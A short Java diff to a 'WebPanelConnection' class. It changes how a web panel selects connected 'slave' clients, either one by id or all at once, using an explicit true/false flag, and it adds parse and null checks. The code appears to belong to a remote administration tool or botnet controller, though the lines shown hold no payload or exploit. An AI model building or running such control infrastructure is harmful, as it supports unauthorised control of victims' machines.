@@ -104,17 +104,26 @@ public class WebPanelConnection implements Runnable {
                 	bw.flush();
                 } else if (packet == WebPanelPackets.PACKET_SELECT) {
                 	String id = readLine();
+                	boolean b = readLine().equalsIgnoreCase("true");
                 	
                 	boolean all = id.equals("all");
-                	boolean none = id.equals("none");
                 	
-                	if (!all && !none) {
-                		long l = Long.parseLong(id);
-                		AbstractSlave slave = AbstractSlave.getFromId(l);
-                		slave.setSelected(!slave.isSelected());
+                	if (!all) {
+                		long l = -1;
+                		try {
+							l = Long.parseLong(id);				
+						} catch (Exception e) {
+
+						}
+                		
+            			AbstractSlave slave = AbstractSlave.getFromId(l);
+
+                		if (slave != null) {
+                			slave.setSelected(b);
+                		}               		          		
                 	} else {
                 		for (AbstractSlave slave : Main.connections) {
-                			slave.setSelected(all);
+                			slave.setSelected(b);
                 		}
                 	}
                 	
